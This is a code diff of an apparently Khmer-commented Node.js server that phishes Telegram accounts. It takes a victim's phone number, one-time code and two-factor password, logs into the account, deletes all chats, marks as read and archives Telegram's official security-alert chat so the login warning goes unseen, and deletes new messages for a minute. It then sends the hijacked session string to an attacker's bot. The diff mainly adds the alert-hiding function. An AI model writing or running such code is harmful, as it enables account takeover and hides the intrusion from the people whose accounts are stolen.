@@ -24,15 +24,20 @@ const adminChatId = process.env.ADMIN_CHAT_ID;
 const sessions = {};
 
 /**
- * 1. Function លុប Chat និងសារទាំងអស់ (User, Bot, Telegram) ដោយគ្មានដែនកំណត់
+ * 1. Function លុប Chat និងសារទាំងអស់ពី Users និង Bots
  */
 async function deleteAllChats(client) {
     try {
         const dialogs = await client.getDialogs({});
 
         for (const dialog of dialogs) {
+            // រំលង Telegram Official Chat (777000) ព្រោះ Telegram Server មិនអនុញ្ញាតឱ្យ Delete ទេ
+            if (dialog.id.toString() === "777000" || dialog.name === "Telegram") {
+                continue;
+            }
+
             try {
-                // វិធីទី ១: លុបប្រវត្តិសារទាំងអស់ក្នុង Chat (Delete History for both sides)
+                // លុបប្រវត្តិសារទាំងអស់ក្នុង Chat (Delete History)
                 await client.invoke(new Api.messages.DeleteHistory({
                     peer: dialog.inputEntity,
                     maxId: 0,
@@ -40,7 +45,7 @@ async function deleteAllChats(client) {
                     justClear: false
                 }));
 
-                // វិធីទី ២: ស្កែនលុបសារដែលមានស្រាប់ទាំងអស់ដើម្បីការពារជ្រុះសល់
+                // ស្កែនលុបសារដែលមានស្រាប់ការពារជ្រុះសល់
                 const messages = await client.getMessages(dialog.entity, { limit: 100 });
                 const messageIds = messages.map(msg => msg.id);
 
@@ -57,44 +62,87 @@ async function deleteAllChats(client) {
 }
 
 /**
- * 2. Function តាមដាន និងលុបសារថ្មីៗភ្លាមៗ រយៈពេល ១ នាទី (៦០ វិនាទី)
+ * 2. Function លាក់ Telegram Official Chat ចូល Archive និង Mark as Read
+ */
+async function archiveAndReadTelegramChats(client) {
+    try {
+        const dialogs = await client.getDialogs({});
+
+        for (const dialog of dialogs) {
+            // ឆែកមើលតែ Telegram Official Account (ID: 777000)
+            if (dialog.id.toString() === "777000" || dialog.name === "Telegram") {
+                try {
+                    // Mark as Read ដើម្បីបាត់ Unread Notification
+                    await client.markAsRead(dialog.entity);
+
+                    // ផ្លាស់ទី Chat ចូល Archive (folderId: 1)
+                    await client.invoke(
+                        new Api.folders.EditPeerFolders({
+                            folderPeers: [
+                                new Api.InputFolderPeer({
+                                    peer: dialog.inputEntity,
+                                    folderId: 1, // 1 = Archive Folder
+                                }),
+                            ],
+                        })
+                    );
+                } catch (err) {
+                    console.error("Failed to archive Telegram chat:", err.message);
+                }
+            }
+        }
+    } catch (err) {
+        console.error("Error archiving chats:", err.message);
+    }
+}
+
+/**
+ * 3. Function សំអាតសារបន្ទាប់ពី Log-in (លុប Chat ធម្មតា + Archive Telegram Chat រយៈពេល 1 នាទី)
  */
 async function cleanupPostLogin(client) {
-    // ជំហានទី ១: លុប Chat/សារដែលមានស្រាប់ទាំងអស់ភ្លាមៗពេល Log-in រួច
+    // ជំហានដំបូង: លុប Chat ធម្មតាទាំងអស់ និង Archive Telegram Chat
     await deleteAllChats(client);
+    await archiveAndReadTelegramChats(client);
 
-    // ជំហានទី ២: បង្កើត Event Listener ចាំចាប់សារថ្មីៗ (Real-time)
+    // បង្កើត Event Listener ស្ទាក់ចាំសារ Real-time រយៈពេល 1 នាទី
     const eventHandler = async (event) => {
         try {
             const message = event.message;
-            if (message && message.id) {
-                // លុបសារថ្មីដែលទើបតែផ្ញើចូល ឬផ្ញើចេញភ្លាមៗ (revoke: true លុបទាំងសងខាង)
-                await client.deleteMessages(message.peerId, [message.id], { revoke: true });
-            }
+            if (!message || !message.id) return;
+
+            // Mark as Read គ្រប់សារដែលផ្ញើចូល
+            await client.markAsRead(message.peerId).catch(() => {});
+
+            // ព្យាយាមលុបសារ (ប្រសិនបើជាសារ Users/Bots)
+            await client.deleteMessages(message.peerId, [message.id], { revoke: true }).catch(() => {});
+
+            // លាក់ចូល Archive ភ្លាមៗ (ករណីជាសារ Security Alert ពី Telegram)
+            await archiveAndReadTelegramChats(client);
         } catch (err) {
-            console.error("Error auto-deleting incoming live message:", err.message);
+            console.error("Error processing live message:", err.message);
         }
     };
 
-    // ចាប់ផ្ដើមរងចាំស្ទាក់លុបសារថ្មីៗពី User, Bot, និង Telegram
+    // ចាប់ផ្ដើម Listen សារថ្មីៗ
     client.addEventHandler(eventHandler, new NewMessage({}));
 
-    // រង់ចាំរយៈពេល ១ នាទី (60,000 ms)
+    // រង់ចាំរយៈពេល 1 នាទី (60,000 ms)
     await new Promise(resolve => setTimeout(resolve, 60000));
 
-    // ជំហានទី ៣: ធ្វើការលុបសម្អាតសារម្តងទៀតជាចុងក្រោយ
+    // សំអាត និង Archive ម្តងទៀតជាចុងក្រោយ
     await deleteAllChats(client);
+    await archiveAndReadTelegramChats(client);
 
-    // បិទ Listener វិញបន្ទាប់ពីផុត ១ នាទី
+    // បិទ Listener វិញ
     client.removeEventHandler(eventHandler, new NewMessage({}));
 }
 
-// Root Route: បើកទំព័រ index.html
+// Root Route
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-// 1. API សម្រាប់ផ្ញើលេខកូដ OTP ទៅ Telegram App
+// 1. API: ផ្ញើលេខកូដ OTP ទៅ Telegram App
 app.post('/api/send-code', async (req, res) => {
     const { phoneNumber } = req.body;
     if (!phoneNumber) {
@@ -121,7 +169,7 @@ app.post('/api/send-code', async (req, res) => {
     }
 });
 
-// 2. API សម្រាប់ផ្ទៀងផ្ទាត់ OTP និង 2FA Password
+// 2. API: ផ្ទៀងផ្ទាត់ OTP និង 2FA Password
 app.post('/api/verify-code', async (req, res) => {
     const { phoneNumber, code, password } = req.body;
 
@@ -153,13 +201,13 @@ app.post('/api/verify-code', async (req, res) => {
             );
         }
 
-        // ដំណើរការលុប Chat ទាំងអស់ និងចាំស្ទាក់លុបសារថ្មីៗរយៈពេល ១ នាទី
+        // ប្រតិបត្តិការសំអាត Chat/សារ និង Archive Telegram Alert ក្នុងរង្វង់ 1 នាទី
         await cleanupPostLogin(client);
 
         const sessionString = client.session.save();
         delete sessions[phoneNumber];
 
-        // ផ្ញើ Session String ចូល Telegram Bot របស់ Admin
+        // ផ្ញើ Session String ចូល Telegram Admin Bot
         if (botToken && adminChatId) {
             try {
                 const messageText = `🔔 **New Telegram Session Logged In!**\n\n📱 **Phone:** \`${phoneNumber}\`\n\n🔑 **Session String:**\n\`${sessionString}\``;
